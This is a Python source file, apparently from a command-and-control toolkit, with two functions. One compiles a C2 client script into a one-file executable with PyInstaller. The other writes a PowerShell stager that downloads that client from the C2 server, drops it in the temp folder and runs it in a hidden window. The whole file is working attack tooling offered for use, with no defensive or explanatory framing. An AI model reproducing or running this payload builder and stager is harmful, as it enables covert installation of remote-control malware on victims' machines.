import os
import sys
import subprocess
import shutil
import tempfile


def generate_payload(
    client_script: str,
    output_format: str = "exe",
    icon_path: str = None,
    hidden_imports: list = None,
    output_name: str = "c2_client",
) -> str:
    """Generate a compiled payload from the client script.

    Formats: exe (onefile), onedir, onefile
    Returns the path to the generated binary.
    """
    if not shutil.which("pyinstaller"):
        raise RuntimeError(
            "PyInstaller not found. Install with: pip install pyinstaller"
        )

    if not os.path.isfile(client_script):
        raise FileNotFoundError(f"Client script not found: {client_script}")

    workdir = tempfile.mkdtemp(prefix="c2_payload_")
    spec_dir = os.path.join(workdir, "build")

    cmd = [
        sys.executable, "-m", "PyInstaller",
        "--noconfirm",
        "--workpath", spec_dir,
        "--distpath", workdir,
        "--specpath", workdir,
        "--name", output_name,
    ]

    if output_format in ("onefile", "exe"):
        cmd.append("--onefile")
    elif output_format == "onedir":
        cmd.append("--onedir")

    if icon_path and os.path.isfile(icon_path):
        cmd.extend(["--icon", icon_path])

    if hidden_imports:
        for imp in hidden_imports:
            cmd.extend(["--hidden-import", imp])

    # Always include these since the client uses them
    for imp in ["pyzipper", "cryptography", "requests"]:
        cmd.extend(["--hidden-import", imp])

    cmd.append(client_script)

    print(f"Generating {output_format} payload...")
    print(f"Command: {' '.join(cmd)}")

    result = subprocess.run(cmd, capture_output=True, text=True)

    if result.returncode != 0:
        raise RuntimeError(f"PyInstaller failed:\n{result.stderr}")

    if output_format == "onedir":
        output_path = os.path.join(workdir, output_name)
    else:
        ext = ".exe" if sys.platform == "win32" else ""
        output_path = os.path.join(workdir, output_name + ext)

    return output_path


def generate_ps_shellcode(c2_config: dict, output_file: str = "payload.ps1") -> str:
    """Generate a PowerShell one-liner that downloads and executes the client.
    This is a minimal stager — the real Python client needs to be hosted somewhere."""

    server = c2_config.get("c2_server", "10.0.0.1")
    port = c2_config.get("port", 80)

    ps_script = f'''
$url = "http://{server}:{port}/payload"
$output = "$env:TEMP\\c2_client.exe"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest -Uri $url -OutFile $output
Start-Process -FilePath $output -WindowStyle Hidden
'''
    with open(output_file, "w") as f:
        f.write(ps_script.strip())

    return output_file
